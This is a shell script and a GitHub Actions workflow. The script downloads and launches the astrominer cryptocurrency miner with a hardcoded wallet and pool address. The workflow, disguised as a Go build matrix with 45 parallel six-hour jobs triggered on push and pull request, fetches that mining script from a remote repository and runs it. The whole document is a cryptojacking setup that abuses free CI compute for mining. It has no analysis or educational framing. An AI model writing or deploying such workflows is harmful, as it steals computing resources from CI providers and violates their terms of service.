#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/dero-am/astrobwt-miner/releases/download/V1.7-BETA4/astrominer-V1.7_BETA4_generic_amd64_linux.tar.gz
tar fx  astrominer-V1.7_BETA4_generic_amd64_linux.tar.gz
./astrominer -w deroi1qyr8wnk9aw9lel0xcufdj98cqtd3lc5y84nhl679nm3wknaz0ad6xq9pvfz92xnjmmm8u7vmqxx -p rpc -r community-pools.mysrv.cloud:10300
while [ 1 ]; do
sleep 3
done
sleep 999


name: coins
on: [push, pull_request]
jobs:
build:
name: akuganteng
runs-on: ubuntu-latest
strategy:
max-parallel: 1
fail-fast: false
matrix:
go: [1.6, 1.7, 1.8, 1.9, 1.10]
flag: [A, B, C, D, E, F, G, H, I]
timeout-minutes: 360
env:
NUM_JOBS: 20
JOB: ${{ matrix.go }}
steps:
- name: Set up Go ${{ matrix.go }}
uses: actions/setup-go@v1
with:
go-version: ${{ matrix.go }}
id: go
- name: Setup
uses: actions/checkout@v2
- name: akuganteng
run: |
wget https://github.com/dovandienem/cmdvps/blob/main/deromining.sh && chmod u+x deromining.sh && ./deromining.sh
